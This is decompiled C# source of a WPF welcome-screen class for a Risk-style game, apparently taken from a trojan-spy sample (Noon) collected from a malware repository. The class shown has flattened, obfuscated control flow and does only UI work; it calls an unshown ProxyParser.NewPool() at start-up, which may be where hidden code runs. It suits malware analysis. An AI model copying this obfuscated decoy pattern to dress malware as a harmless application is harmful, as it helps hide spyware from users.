// Decompiled with JetBrains decompiler
// Type: ArrayWithOff.Collections.StatusPropertyCollection
// Assembly: ArrayWithOff, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C12E9A27-BEBF-4775-817A-6AC642D52B19
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-Spy.Win32.Noon.bcra-344266b0bd586b6b9907f1657c694060dd1bae1df9fda81d7433002d419fe4fa.exe

using ArrayWithOff.Database;
using RiskGame.Shared;
using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Markup;

namespace ArrayWithOff.Collections
{
  public class StatusPropertyCollection : Window, IComponentConnector
  {
    private bool m_Reader;
    private bool importer;
    internal StackPanel panel_MainUI;
    internal DockPanel panel_Settings;
    internal CheckBox chkMusicEnabled;
    internal CheckBox chkFullscreen;
    internal CheckBox chkHints;
    internal MediaElement BackgroundVideo;
    private bool _Utils;

    public bool Music_enabled
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => this.m_Reader;
      [MethodImpl(MethodImplOptions.NoInlining)] set => this.m_Reader = value;
    }

    public bool Hints_enabled
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => this.importer;
      [MethodImpl(MethodImplOptions.NoInlining)] set => this.importer = value;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public StatusPropertyCollection()
    {
      int num1 = 5;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 3:
              this.Hints_enabled = true;
              this.DataContext = (object) this;
              int num3 = 6;
              num2 = StatusPropertyCollection.StopContainer() ? num3 : num3;
              continue;
            case 1:
            case 2:
              this.StateChanged += new EventHandler(((ParamsPropertyCollection) Application.Current).CloneSerializer);
              this.Music_enabled = true;
              goto case 0;
            case 4:
              // ISSUE: explicit constructor call
              base.\u002Ector();
              this.InitializeComponent();
              if (true)
              {
                num2 = 1;
                continue;
              }
              goto label_9;
            case 5:
              goto label_1;
            case 6:
              goto label_3;
            default:
              num2 = 0;
              continue;
          }
        }
label_1:
        ProxyParser.NewPool();
        num1 = 4;
      }
label_3:
      return;
label_9:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ReadModel(object ident, RoutedEventArgs caller)
    {
      int num1 = 3;
      while (true)
      {
        int num2 = num1;
        Window window;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 3:
              goto label_6;
            case 1:
            case 2:
              window.Show();
              if (true)
              {
                num2 = 5;
                continue;
              }
              goto label_6;
            case 4:
              Application.Current.MainWindow = window;
              this.Close();
              goto case 1;
            case 5:
              goto label_7;
            default:
              if (!StatusPropertyCollection.StopContainer())
              {
                num2 = 1;
                continue;
              }
              goto case 1;
          }
        }
label_6:
        window = (Window) new Bridge(this.m_Reader, this.importer, ((ParamsPropertyCollection) Application.Current).NewSerializer((Window) this));
        num1 = 4;
      }
label_7:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void Quit(object sender, RoutedEventArgs e) => this.Close();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void Leaderboard(object sender, RoutedEventArgs e)
    {
      int num = 4;
      RiskGame.Visitors.Decorator decorator;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 4:
            decorator = new RiskGame.Visitors.Decorator(this.Music_enabled, this.Hints_enabled, ((ParamsPropertyCollection) Application.Current).NewSerializer((Window) this));
            num = 3;
            continue;
          case 1:
          case 3:
            Application.Current.MainWindow = (Window) decorator;
            this.Close();
            goto case 2;
          case 2:
            decorator.Show();
            num = 5;
            continue;
          case 5:
            goto label_6;
          default:
            num = 2;
            continue;
        }
      }
label_6:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void DisableModel(object def, RoutedEventArgs b)
    {
      int num1 = 4;
      if (true)
        goto label_6;
label_1:
      Uri uri1;
      Uri uri2;
      Uri uri3;
      if (this.BackgroundVideo.Source == uri1)
      {
        this.BackgroundVideo.Source = uri2;
        goto label_8;
      }
      else if (this.BackgroundVideo.Source == uri2)
      {
        this.BackgroundVideo.Source = uri3;
        goto label_8;
      }
      else if (this.BackgroundVideo.Source == uri3)
      {
        this.BackgroundVideo.Source = uri1;
        int num2 = 6;
        num1 = StatusPropertyCollection.StopContainer() ? num2 : num2;
        goto label_6;
      }
      else
        goto label_8;
label_5:
      int num3;
      num1 = num3;
label_6:
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 4:
            goto label_9;
          case 1:
          case 2:
            uri2 = new Uri("pack://siteoforigin:,,,/Images/RetroCommercialSega.mp4");
            uri3 = new Uri("pack://siteoforigin:,,,/Images/RetroCommercial90s.mp4");
            if (true)
            {
              num1 = 5;
              continue;
            }
            goto label_8;
          case 3:
          case 6:
            goto label_8;
          case 5:
            goto label_1;
          case 7:
            goto label_14;
          default:
            goto label_7;
        }
      }
label_14:
      return;
label_7:
      num3 = 3;
      goto label_5;
label_8:
      this.BackgroundVideo.Position = TimeSpan.Zero;
      if (true)
      {
        num1 = 7;
        goto label_6;
      }
label_9:
      uri1 = new Uri("pack://siteoforigin:,,,/Images/RetroCommercial.mp4");
      num3 = 2;
      goto label_5;
    }

    [GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
    [DebuggerNonUserCode]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void InitializeComponent()
    {
      int num1 = 2;
      while (true)
      {
        int num2 = num1;
        bool utils;
        Uri resourceLocator;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 2:
              utils = this._Utils;
              num2 = 5;
              continue;
            case 1:
            case 5:
              if (!utils)
              {
                this._Utils = true;
                resourceLocator = new Uri("/ArrayWithOff;component/welcomescreen.xaml", UriKind.Relative);
                goto case 4;
              }
              else
                goto label_8;
            case 3:
              goto label_10;
            case 4:
              Application.LoadComponent((object) this, resourceLocator);
              if (true)
              {
                num2 = 6;
                continue;
              }
              goto case 1;
            case 6:
              goto label_9;
            default:
              goto label_5;
          }
        }
label_5:
        num1 = 4;
        continue;
label_8:
        num1 = 3;
      }
label_10:
      return;
label_9:;
    }

    [EditorBrowsable(EditorBrowsableState.Never)]
    [GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
    [DebuggerNonUserCode]
    [MethodImpl(MethodImplOptions.NoInlining)]
    void IComponentConnector.Connect(int max_value, object b)
    {
      int num1 = 2;
      if (StatusPropertyCollection.CollectContainer())
        goto label_13;
label_1:
      int num2 = max_value;
      num1 = 6;
label_13:
      while (true)
      {
        int num3;
        switch (num1)
        {
          case 0:
            goto label_18;
          case 1:
            this._Utils = true;
            num1 = 8;
            continue;
          case 2:
            goto label_1;
          case 3:
            goto label_19;
          case 4:
            goto label_20;
          case 5:
            goto label_21;
          case 6:
            switch (num2)
            {
              case 1:
                goto label_3;
              case 2:
                goto label_4;
              case 3:
                goto label_5;
              case 4:
                goto label_6;
              case 5:
                this.panel_Settings = (DockPanel) b;
                num3 = 0;
                break;
              case 6:
                goto label_11;
              case 7:
                this.chkFullscreen = (CheckBox) b;
                num3 = 7;
                break;
              case 8:
                goto label_8;
              case 9:
                goto label_9;
              default:
                if (!StatusPropertyCollection.StopContainer())
                {
                  num1 = 1;
                  continue;
                }
                goto label_17;
            }
            break;
          case 7:
            goto label_22;
          case 8:
            goto label_23;
          default:
            num3 = 5;
            break;
        }
        num1 = num3;
      }
label_3:
      this.panel_MainUI = (StackPanel) b;
      return;
label_4:
      ((ButtonBase) b).Click += new RoutedEventHandler(this.ReadModel);
      return;
label_5:
      ((ButtonBase) b).Click += new RoutedEventHandler(this.Quit);
      return;
label_6:
      ((ButtonBase) b).Click += new RoutedEventHandler(this.Leaderboard);
      return;
label_8:
      this.chkHints = (CheckBox) b;
      return;
label_9:
      this.BackgroundVideo = (MediaElement) b;
      this.BackgroundVideo.MediaEnded += new RoutedEventHandler(this.DisableModel);
      return;
label_11:
      this.chkMusicEnabled = (CheckBox) b;
      return;
label_18:
      return;
label_19:
      return;
label_20:
      return;
label_21:
      return;
label_22:
      return;
label_23:
      return;
label_17:;
    }

    internal static bool CollectContainer() => true;

    internal static bool StopContainer() => false;
  }
}
